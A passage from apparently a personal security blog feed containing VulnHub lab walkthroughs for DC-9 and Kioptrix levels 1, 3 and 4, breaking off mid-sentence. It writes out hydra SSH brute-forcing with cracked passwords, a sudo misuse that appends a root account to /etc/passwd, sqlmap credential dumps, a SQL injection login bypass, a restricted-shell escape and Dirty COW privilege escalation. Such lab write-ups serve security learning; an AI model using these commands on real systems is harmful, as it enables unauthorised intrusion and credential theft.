subsequent brute-force attacks.</p><p><img src="/2023/04/27/file-upload/image-20231114114012641.png" alt="image-20231114114012641"></p><p>hydra:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">┌──(root㉿kali)-[~/Desktop/vulnhub/DC<span class="hljs-number">-9</span>]<br>└─# hydra -L user -P pass <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span> ssh <br>Hydra v9<span class="hljs-number">.5</span> (c) <span class="hljs-number">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> use <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (<span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> non-binding, these *** ignore laws <span class="hljs-keyword">and</span> ethics anyway).<br><br>Hydra (https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra) starting at 2023-11-13 22:41:38</span><br><span class="hljs-string">[WARNING]</span> Many SSH configurations limit the number of parallel tasks, it <span class="hljs-keyword">is</span> recommended to reduce the tasks: use -t <span class="hljs-number">4</span><br><span class="hljs-string">[WARNING]</span> Restorefile (ignored ...) <span class="hljs-keyword">from</span> a previous session found, to prevent overwriting, ./hydra.restore<br><span class="hljs-string">[DATA]</span> max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">391</span> login tries (l:<span class="hljs-number">17</span>/p:<span class="hljs-number">23</span>), ~<span class="hljs-number">25</span> tries per task<br><span class="hljs-string">[DATA]</span> attacking ssh:<span class="hljs-comment">//192.168.122.20:22/</span><br><span class="hljs-string">[22]</span>[ssh] host: <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span>   login: chandlerb   password: UrAG0D!<br><span class="hljs-string">[22]</span>[ssh] host: <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span>   login: joeyt   password: Passw0rd<br><span class="hljs-string">[STATUS]</span> <span class="hljs-number">357.00</span> tries/min, <span class="hljs-number">357</span> tries <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">01</span>h, <span class="hljs-number">35</span> to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">01</span>h, <span class="hljs-number">15</span> active<br><span class="hljs-string">[22]</span>[ssh] host: <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span>   login: janitor   password: Ilovepeepee<br><span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">3</span> valid passwords found<br><span class="hljs-string">[WARNING]</span> Writing restore file because <span class="hljs-number">1</span> <span class="hljs-keyword">final</span> worker threads did <span class="hljs-keyword">not</span> complete until end.<br><span class="hljs-string">[ERROR]</span> <span class="hljs-number">1</span> target did <span class="hljs-keyword">not</span> resolve <span class="hljs-keyword">or</span> could <span class="hljs-keyword">not</span> be connected<br><span class="hljs-string">[ERROR]</span> <span class="hljs-number">0</span> target did <span class="hljs-keyword">not</span> complete<br>Hydra (https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra) finished at 2023-11-13 22:42:46</span><br></code></pre></td></tr></table></figure><ul><li>chandlerb&#x2F;UrAG0D!</li><li>joeyt&#x2F;Passw0rd</li><li>janitor&#x2F;Ilovepeepee</li></ul><p>I logged in all three accounts and finally found something interesting with user janitor:</p><p><img src="/2023/04/27/file-upload/image-20231114115006218.png" alt="image-20231114115006218"></p><p>check this directory:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">janitor<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:~/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>ls<br>passwords-found-on-post-it-notes.txt<br>janitor<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:~/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>cat passwords-found-on-post-it-notes.txt <br><span class="hljs-title class_">BamBam01</span><br><span class="hljs-title class_">Passw0rd</span><br>smellycats<br><span class="hljs-title class_">P0Lic</span><span class="hljs-comment">#10-4</span><br><span class="hljs-title class_">B4</span>-<span class="hljs-title class_">Tru3</span><span class="hljs-number">-001</span><br><span class="hljs-number">4</span>uGU5T-<span class="hljs-title class_">NiGHts</span><br></code></pre></td></tr></table></figure><p>some new passwords! Add to our pass list and try hydra again:</p><p><img src="/2023/04/27/file-upload/image-20231114115744136.png" alt="image-20231114115744136"></p><p>We got a new user fredf.</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs elixir">fredf<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>ls -al /home/fredf/<br>total <span class="hljs-number">12</span><br>drwx------  <span class="hljs-number">3</span> fredf fredf <span class="hljs-number">4096</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">14</span> <span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span> .<br>drwxr-xr-x <span class="hljs-number">19</span> root  root  <span class="hljs-number">4096</span> <span class="hljs-title class_">Dec</span> <span class="hljs-number">29</span>  <span class="hljs-number">2019</span> ..<br>lrwxrwxrwx  <span class="hljs-number">1</span> fredf fredf    <span class="hljs-number">9</span> <span class="hljs-title class_">Dec</span> <span class="hljs-number">29</span>  <span class="hljs-number">2019</span> .bash_history -&gt; /dev/null<br>drwx------  <span class="hljs-number">3</span> fredf fredf <span class="hljs-number">4096</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">14</span> <span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span> .gnupg<br>fredf<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> fredf on dc<span class="hljs-number">-9</span>:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> fredf may run the following commands on dc<span class="hljs-number">-9</span>:<br>    (root) <span class="hljs-symbol">NOPASSWD:</span> /opt/devstuff/dist/test/test<br></code></pre></td></tr></table></figure><p>It’s evident that we can execute &#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test in root privilege.</p><p>Let’s dig deeper.</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">fredf@dc-<span class="hljs-number">9</span>:/home/janitor/.secrets-<span class="hljs-keyword">for</span>-putin$ /<span class="hljs-keyword">opt</span>/devstuff/dist/test/test<br>Usage: <span class="hljs-keyword">python</span> test.<span class="hljs-keyword">py</span> <span class="hljs-keyword">read</span> <span class="hljs-keyword">append</span><br>fredf@dc-<span class="hljs-number">9</span>:/home/janitor/.secrets-<span class="hljs-keyword">for</span>-putin$ <span class="hljs-keyword">find</span> / -name test.<span class="hljs-keyword">py</span> -<span class="hljs-built_in">type</span> <span class="hljs-keyword">f</span> <span class="hljs-number">2</span>&gt;/dev/null <br>/<span class="hljs-keyword">opt</span>/devstuff/test.<span class="hljs-keyword">py</span><br>/usr/lib/<span class="hljs-keyword">python3</span>/dist-packages/setuptools/<span class="hljs-keyword">command</span>/test.<span class="hljs-keyword">py</span><br>fredf@dc-<span class="hljs-number">9</span>:/home/janitor/.secrets-<span class="hljs-keyword">for</span>-putin$ <span class="hljs-keyword">cat</span> /<span class="hljs-keyword">opt</span>/devstuff/test.<span class="hljs-keyword">py</span><br>#!/usr/bin/<span class="hljs-keyword">python</span><br><br>import sys<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span> (sys.<span class="hljs-built_in">argv</span>) != <span class="hljs-number">3</span> :<br>    <span class="hljs-keyword">print</span> (<span class="hljs-string">&quot;Usage: python test.py read append&quot;</span>)<br>    sys.<span class="hljs-keyword">exit</span> (<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">else</span> :<br>    <span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(sys.<span class="hljs-built_in">argv</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;r&quot;</span>)<br>    output = (<span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>())<br><br>    <span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(sys.<span class="hljs-built_in">argv</span>[<span class="hljs-number">2</span>], <span class="hljs-string">&quot;a&quot;</span>)<br>    <span class="hljs-keyword">f</span>.<span class="hljs-keyword">write</span>(output)<br>    <span class="hljs-keyword">f</span>.<span class="hljs-keyword">close</span>()<br></code></pre></td></tr></table></figure><p>It seems that test.py file is the “key” to the root. Test.py is used to append the content of file A to another file B(root privilege). The most direct approach is to modify &#x2F;etc&#x2F;passwd.</p><p>generate the passwd:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(root㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>vulnhub/DC-<span class="hljs-number">9</span>]<br>└─<span class="hljs-comment"># openssl passwd -1 -salt ry4n 123456</span><br><span class="hljs-variable">$1</span><span class="hljs-variable">$ry4n</span><span class="hljs-variable">$S75u7SLn8eSw62A1NbqTj</span>/<br></code></pre></td></tr></table></figure><p>append user to &#x2F;etc&#x2F;passwd file:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby">fredf<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>echo <span class="hljs-string">&#x27;ry4n:$1$ry4n$S75u7SLn8eSw62A1NbqTj/:0:0::/root:/usr/bin/bash&#x27;</span> &gt; <span class="hljs-regexp">/tmp/ry</span>4n<br>fredf<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>sudo /opt/devstuff/dist/test/test /tmp/ry4n /etc/passwd<br>fredf<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>su ry4n<br><span class="hljs-title class_">Password</span>: <br>root<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-comment"># id</span><br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br>root<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>ROOT IT!</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_kioptrix_level_1</title>
    <link href="/2024/07/23/vulnhub_kioptrix_level_1/"/>
    <url>/2024/07/23/vulnhub_kioptrix_level_1/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-level-1"><a href="#vulnhub-kioptrix-level-1" class="headerlink" title="vulnhub_kioptrix_level_1"></a>vulnhub_kioptrix_level_1</h1><p>In the coming period, I will progressively update write-ups on various OSCP-LIKE machines, and this is my first write-up on vulnhub.</p><p>Firstly, alter the machine’s network connectivity mode to NAT and use <strong>arp-scan</strong> to acquire its IP address (this tool is highly efficient and convenient).</p><p>(-l param means localnet)</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102132027468.png" alt="image-20231102132027468"></p><p>The target is 192.168.122.12.</p><p>The process of conducting a comprehensive port scan with <strong>nmap</strong> is quite time-consuming. Therefore, I prefer to utilize <strong>masscan</strong> initially to identify the open ports and subsequently perform a detailed scan with nmap.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102132503180.png" alt="image-20231102132503180"></p><p>then it comes to nmap:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102132553091.png" alt="image-20231102132553091"></p><p>nmap -sC -sS -sV -A -p 22,80,111,139,443,1024 192.168.122.12</p><p>What interests me most is the HTTP service running on port 80.</p><p>Now it’s time for <strong>dirsearch</strong> and <strong>nikto</strong>.</p><p>dirsearch for directory bruteforce:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102133323051.png" alt="image-20231102133323051"></p><p>nothing interesting except &#x2F;usage:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102133456170.png" alt="image-20231102133456170"></p><p>The tiny text at the bottom caught my attention：”generated by <strong>Webalizer</strong> Version 2.01”</p><p>I attempted to acquire something useful via searchsploit, preferably directly identifying exploitable vulnerabilities.</p><p>unfortunately：</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102133925008.png" alt="image-20231102133925008"></p><p>Let’s turn to nikto!</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102134035623.png" alt="image-20231102134035623"></p><p>It brings me a lot:</p><ul><li>outdated mod_ssl,apache,openssl</li><li>&#x2F;test.php</li><li>some php backdoor file manager(all of these are False Positives XD)</li></ul><p>The &#x2F;test.php page simply displays “TEST” without any other info, skip skip skip. Currently, the remaining that have not been tested are <strong>mod_ssl</strong>, Apache, and others.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102134702818.png" alt="image-20231102134702818"></p><p>BINGO! Here comes several BOF vulnerabilities. I select <code>Apache mod_ssl &lt; 2.8.7 OpenSSL — ‘OpenFuckV2.c’ Remote Buffer Overflow (2)</code>, and then use -m param to copy it to my own dir.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102134959536.png" alt="image-20231102134959536"></p><p>The usage of this script is indicated in the comments, but a error stopped me when I follow the command :<code>fatal error: openssl/ssl.h: No such file or directory</code> . No worries, just simply download it by <code>apt-get install libssl-dev``. However , a new issue has arisen as some functionalities have been deprecated. By consulting GPT, I found way to resolve it : adding the </code>-Wno-deprecated-declarations&#96; flag to ignore warnings. Now we can finally successfully compile it :</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102140039760.png" alt="image-20231102140039760"></p><p>The remaining steps are truely smooth. Simply follow the instructions and execute the exp — — Successfully gain access to root privileges !</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102140150839.png" alt="image-20231102140150839"></p><p>Wait Wait Wait 😝</p><p>Messages above are all about HTTP service on port 80, why not give SMB a try ? (Remembering that nmap scan tells us not only port 80 is open)</p><p>enum4linux — nothing:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141009194.png" alt="image-20231102141009194"></p><p>smbclient — nothing:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141130174.png" alt="image-20231102141130174"></p><p>Ultimately, utilize the MSF to detect the version of the SMB protocol.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141422083.png" alt="image-20231102141422083"></p><p>Samba 2.2.1a, turn to searchsploit:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141513795.png" alt="image-20231102141513795"></p><p>Perfect ! There exists a exploit script in MSF :</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141650432.png" alt="image-20231102141650432"></p><p>Everything appears to be progressing smoothly, but I am still unable to obtain a shell. The scenario appears in the provided image, where the shell connection is established but consistently interrupted, is highly likely to be attributed to a mismatch between the targets or payloads.</p><p>Let’s attempt to ultilize a more common payload: shell&#x2F;reverse_tcp instead of meterpreter&#x2F;reverse_tcp.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102142207965.png" alt="image-20231102142207965"></p><p>🎉🎉🎉</p><p>Welcome to communicate with me. Everything !</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_kioptrix_level_3</title>
    <link href="/2024/07/23/vulnhub_kioptrix_level_3/"/>
    <url>/2024/07/23/vulnhub_kioptrix_level_3/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-level-3"><a href="#vulnhub-kioptrix-level-3" class="headerlink" title="vulnhub_kioptrix_level_3"></a>vulnhub_kioptrix_level_3</h1><p>Here comes another walkthrough on KIOPTRIX series!</p><p>First off, we ought to modify &#x2F;etc&#x2F;hosts file and add the following line:</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.122.14</span> #your target ip  kioptrix3.com<br></code></pre></td></tr></table></figure><p>Let’s start with some routine scan.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">masscan</span> -p1-<span class="hljs-number">65535</span> <span class="hljs-number">192.168.122.14</span> --rate=<span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106151902727.png" alt="image-20231106151902727"></p><p><code>nmap -sC -sS -sV -A -p 22,80 192.168.122.14</code></p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231109085916455.png" alt="image-20231109085916455"></p><p>There’re only two open ports: port 22 and port 80.</p><p>Clearly, it’s evident that we need to focus on HTTP service.</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nikto</span> -h <span class="hljs-number">192.168.122.14</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106152403497.png" alt="image-20231106152403497"></p><p>Sevaral results capture my interest which could have vulnerabilities, such as phpmyadmin(MYSQL).</p><p>Access it using firefox and attempt to login by brute force:</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106153305168.png" alt="image-20231106153305168"></p><p>Unfortunately, it doesn’t work.</p><p>For the next step, I intend to directly access http server on port 80:</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106153753112.png" alt="image-20231106153753112"></p><p>At the top of this page, there are three modules that can be observed:HOME, BLOG, and LOGIN.</p><p>After some experimentation, I have discovered a suspicious feature point where there may be a potential vulnerability for SQL injection — — sort.</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106154444619.png" alt="image-20231106154444619"></p><p>Take a look at the url, the param ID interests me.</p><p>Let me perform a simple test by appending a <code>&#39;</code> after the parameter. An error has occurred!</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106155105908.png" alt="image-20231106155105908"></p><p>SQLMAP:</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">sqlmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">u</span> <span class="hljs-string">&quot;http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=size#photos&quot;</span> <span class="hljs-operator">-</span><span class="hljs-built_in">D</span> <span class="hljs-variable">gallery</span> <span class="hljs-operator">-</span><span class="hljs-variable">T</span> <span class="hljs-type">dev_accounts</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-variable">username</span><span class="hljs-operator">,</span><span class="hljs-variable">password</span> <span class="hljs-operator">--</span><span class="hljs-variable">dump</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106155327482.png" alt="image-20231106155327482"></p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106155646715.png" alt="image-20231106155646715"></p><p>So far, I have obtained two accounts which can be successfully used to login using ssh.</p><p>Do you remember the login page on the homepage we haven’t access? Now let’s do it.</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106160547043.png" alt="image-20231106160547043"></p><p>After unsuccessful attempts to access the backend using methods such as sql injection and brute force, I noticed the presence of ‘LotusCms’.</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">searchsploit LotusCMS</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106161007373.png" alt="image-20231106161007373"></p><p>Download the exp from google and then execute:</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106161303607.png" alt="image-20231106161303607"></p><p>We can also obtain a shell as well, however, the privilege is lower, compared to the previous one.</p><p>An indeed famous vulnerability caught my attention when I finished performing the inspection using linpeas — DIRTY COW.</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106163430745.png" alt="image-20231106163430745"></p><p>I exploited it with firefart’s code.(<a href="https://github.com/firefart/dirtycow">firefart&#x2F;dirtycow: Dirty Cow exploit — CVE-2016–5195 (github.com)</a>)</p><p>Next, let us proceed step by step.</p><p>Compile:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>gcc -pthread dirty.c -o dirty -lcrypt<br>gcc -pthread dirty.c -o dirty -lcrypt<br>www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>ls<br>ls<br>dirty  dirty.c  exp.c  linpeas.sh<br></code></pre></td></tr></table></figure><p>Exploit:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>./dirty firefart<br>./dirty firefart<br>/etc/passwd successfully backed up to /tmp/passwd.bak<br><span class="hljs-title class_">Please</span> enter the new <span class="hljs-symbol">password:</span> firefart<br><span class="hljs-title class_">Complete</span> <span class="hljs-symbol">line:</span><br><span class="hljs-symbol">firefart:</span>fik57D3GJz/<span class="hljs-symbol">tk:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:pwned</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><br><span class="hljs-symbol">mmap:</span> b7fe0000<br></code></pre></td></tr></table></figure><p>Commands displayed above funtions to create a root-level firefart account with password firefart.</p><p>ROOT IT:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/home/www/kioptrix3</span>.com<span class="hljs-variable">$ </span>su firefart<br>su firefart<br><span class="hljs-symbol">Password:</span> firefart<br><br>firefart<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/home/www/kioptrix3</span>.com<span class="hljs-comment"># id</span><br>id<br>uid=<span class="hljs-number">0</span>(firefart) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_kioptrix_level_4</title>
    <link href="/2024/07/23/vulnhub_kioptrix_level_4/"/>
    <url>/2024/07/23/vulnhub_kioptrix_level_4/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-level-4"><a href="#vulnhub-kioptrix-level-4" class="headerlink" title="vulnhub_kioptrix_level_4"></a>vulnhub_kioptrix_level_4</h1><p>Welcome to the 4th installment of the multi-level KIOPTRIX vulnhub series, and there’s only one box left. Let’s dive into level 4!</p><p>Port scan with masscan:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107133253518.png" alt="image-20231107133253518"></p><p>Service and vul scan for further details:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107133425955.png" alt="image-20231107133425955"></p><p>It is evident that the focus is on the Samba and HTTP service.</p><p>enum4linux:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107133847734.png" alt="image-20231107133847734"></p><p>The tool successfully enumerated several users on the target machine. Take a note for future reference.</p><p>smbclient:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107134155918.png" alt="image-20231107134155918"></p><p>Nothing interesting.</p><p>dirsearch:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107134416174.png" alt="image-20231107134416174"></p><p>I can finally discover something intriguing after inspecting each page carefully.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107134937886.png" alt="image-20231107134937886"></p><p>This page leaked the username john.</p><p>Next step I choose to access the homepage via firefox:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107140316236.png" alt="image-20231107140316236"></p><p>Here comes a classic login panel! Upon seeing this, multi thoughts come to my mind.</p><ul><li>SQLi</li><li>Brute force</li><li>CMS vul</li><li>…</li></ul><p>There’s no exploitable vulnerabilities about LigGoat and I couldn’t access valid accounts with brute force.</p><p>Let’s check if there exists a SQL injection.</p><p>Input a <code>&#39;</code> in both username and password blanks:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107141050500.png" alt="image-20231107141050500"></p><p>An error occurred!</p><p>After further testing, I discovered that the password field is vulnerable to SQL injection. I attempted to access the backend by entering the username “john” and the password <code>’ or 1=1 #</code>or 1&#x3D;1# to validate this issue.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107141341193.png" alt="image-20231107141341193"></p><p>I obtained the password for robert using the same approach.</p><p>john\MyNameIsJohn</p><p>robert\ADGAdsafdfwt4gadfga&#x3D;&#x3D;</p><p>Attempt to login as john using ssh:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107141854112.png" alt="image-20231107141854112"></p><p>The shell I obtained was severely restricted. However, I successfully bypass it using <code>echo os.system(&#39;/bin/bash&#39;)</code> and gained an interactive shell.</p><p>I could switch to robert account with the password obtained above, so I tried <code>sudo -l</code> to access higher privilege, but failed.</p><p>linpeas.sh:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107143910329.png" alt="image-20231107143910329"></p><p>MYSQL!</p><p>I focused on finding leaked creds, and ultimately discovered the MySQL account password in the “checklogin” file.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107142736153.png" alt="image-20231107142736153"></p><p>Once connected to MySQL, I issued a SQL query to determine if UDF was available within MySQL.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107144212528.png" alt="image-20231107144212528"></p><p>Fortunately, it’s available.</p><p>Solutions to gain root privilege I can think of are following:</p><ul><li>add john to admin group</li><li>manipulate the &#x2F;bin&#x2F;sh file</li></ul><p>First way:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107144646517.png" alt="image-20231107144646517"></p><p>it 